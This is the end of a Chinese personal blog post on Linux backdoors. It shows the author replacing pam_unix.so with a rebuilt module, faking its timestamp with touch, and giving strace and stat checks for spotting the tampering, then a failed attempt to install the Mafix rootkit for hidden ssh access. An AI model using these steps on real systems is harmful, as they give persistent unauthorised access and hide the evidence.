<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp &#x2F;root&#x2F;Linux-PAM-1.1.8&#x2F;modules&#x2F;pam_unix&#x2F;.libs&#x2F;pam_unix.so &#x2F;usr&#x2F;lib64&#x2F;security&#x2F;</span><br></pre></td></tr></table></figure>

<p>修改pam模块时间属性</p>
<p><img src="https://i.loli.net/2020/03/12/Myk4pwdoZcBPN6X.png" alt="Snipaste_2020-03-12_17-30-23.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch -t 201804111122 pam_unix.so</span><br></pre></td></tr></table></figure>

<p>前面都没问题，但是最后连接不上。。。</p>
<p><strong>排查技巧</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 1、通过Strace跟踪ssh</span><br><span class="line">ps axu | grep sshd</span><br><span class="line">strace -o aa -ff -p PID</span><br><span class="line">grep open aa* | grep -v -e No -e null -e denied| grep WR</span><br><span class="line"># 2、检查pam_unix.so的修改时间</span><br><span class="line">stat &#x2F;lib&#x2F;security&#x2F;pam_unix.so      #32位</span><br><span class="line">stat &#x2F;lib64&#x2F;security&#x2F;pam_unix.so    #64位</span><br></pre></td></tr></table></figure>

<hr>
<h4><span id="10-rookit后门">10、rookit后门</span></h4><blockquote>
<p>Mafix是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现远程登陆的特点是配置简单并可以自定义验证密码和端口号。</p>
<p>利用方法：安装完成后，使用ssh 用户@IP -P 配置的端口，即可远程登录。</p>
</blockquote>
<p>我本地测试了下，直接报错了，</p>
<p><img src="https://i.loli.net/2020/03/12/oBaFQP8em2j5OyE.png" alt="Snipaste_2020-03-12_18-12-45.png"></p>
<blockquote>
<p>64位系统中安装了32位程序解决办法 是因为64位系统中安装了32位程序 解决方法：  代码如下 复制代码 yum install glibc.i686 问题二，解决交叉编译环境错误 # </p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install glibc.i686</span><br></pre></td></tr></table></figure>

<blockquote>
<p>centos6起<code>/etc/syslog.conf</code>不再有！而是<code>/etc/rsyslog.conf</code>代替！</p>
</blockquote>
<p>仍然有几个错误无法解决，但是网上流传的大多是这个版本。。</p>
<p>关于rookit需要继续探索。</p>
<hr>
<h4><span id="参考链接">参考链接：</span></h4><p> <a href="https://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&amp;mid=2448904990&amp;idx=1&amp;sn=9d5ed78f2d760540e4a40e5e9bb29048&amp;chksm=8b55c343bc224a55998647ff96c8e96a81fa128f2d32c6d95e0e83e1cde1a5b996612b52333a&amp;scene=126&amp;sessionid=1583909254&amp;key=8eee0b50946f7fa18c094b8a6874c7b06957421cd93368879b6f05c195994e2fd058437935c4fc42c9c748d7f973843bc7ac101fc59b6016f6d14860397b7d6d10e0dd011612fd7cb274951496f98813&amp;ascene=1&amp;uin=NzY4MzU5NDcy&amp;devicetype=Windows+10&amp;version=62080074&amp;lang=zh_CN&amp;exportkey=AR76JlF7ukKA%2B%2FrHmZNLPg4%3D&amp;pass_ticket=DQ6PMsSqx8syDl1t9nL1Y2s5T9VMq8kFaoEXTwcSMOZoXARa3QjAHcL6ZTfCpZ63" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&amp;mid=2448904990&amp;idx=1&amp;sn=9d5ed78f2d760540e4a40e5e9bb29048&amp;chksm=8b55c343bc224a55998647ff96c8e96a81fa128f2d32c6d95e0e83e1cde1a5b996612b52333a&amp;scene=126&amp;sessionid=1583909254&amp;key=8eee0b50946f7fa18c094b8a6874c7b06957421cd93368879b6f05c195994e2fd058437935c4fc42c9c748d7f973843bc7ac101fc59b6016f6d14860397b7d6d10e0dd011612fd7cb274951496f98813&amp;ascene=1&amp;uin=NzY4MzU5NDcy&amp;devicetype=Windows+10&amp;version=62080074&amp;lang=zh_CN&amp;exportkey=AR76JlF7ukKA%2B%2FrHmZNLPg4%3D&amp;pass_ticket=DQ6PMsSqx8syDl1t9nL1Y2s5T9VMq8kFaoEXTwcSMOZoXARa3QjAHcL6ZTfCpZ63</a> </p>
<p> <a href="https://blog.51cto.com/huangzp/1911767" target="_blank" rel="noopener">https://blog.51cto.com/huangzp/1911767</a> </p>
<p> <a href="https://www.cnblogs.com/beautiful-code/p/9441757.html" target="_blank" rel="noopener">https://www.cnblogs.com/beautiful-code/p/9441757.html</a></p>

            </div>
          

    
      <footer class="post-footer">

        
         <div>    
          
          <ul class="post-copyright">
             <li class="post-copyright-link">
              <strong>本文作者：</strong>
              <a href="/" title="欢迎访问 glotozz 的个人博客">glotozz</a>
            </li>

            <li class="post-copyright-license">
              <strong>版权声明： </strong>
               本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议。转载请注明出处！
            </li>
          </ul>
        
      </div>
      
        <div class="post-tags">
          
            <a href="/tags/Linux/" rel="tag"><i class="fa fa-tag"></i> Linux</a>
          
        </div>
      

        
        
  <nav class="post-nav">
    
    
      <a class="next" href="/2020/03/08/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B/">
        <span class="next-text nav-default">XCTF高校战“疫”网络安全分享赛</span>
        <span class="prev-text nav-mobile">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    
  </nav>

        
  <div class="comments" id="comments">
    
      <div id="vcomments"></div>
    
  </div>


      </footer>
    
  </article>

    </div>

      </div>

      <footer id="colophon">
<span class="copyright-year">
    
        &copy;
    
    2020
    <span class="footer-author">glotozz.</span>
    <span class="power-by">
        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
    </span>
</span>
      </footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div>
    



  
<!-- valine Comments -->
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js"></script>
<script type="text/javascript">
    new Valine({
        el: '#vcomments',
        notify: false,
        verify: false,
        app_id: "d2XJ52o9D5xTnDd2J92VPPna-gzGzoHsz",
        app_key: "P6wHC0f6Fn02hW8SSdnax8wa",
        placeholder: "Just go go",
        avatar: 'mm'
    });
</script>


    




  
    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
  

  

    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>

  </body>
</html>
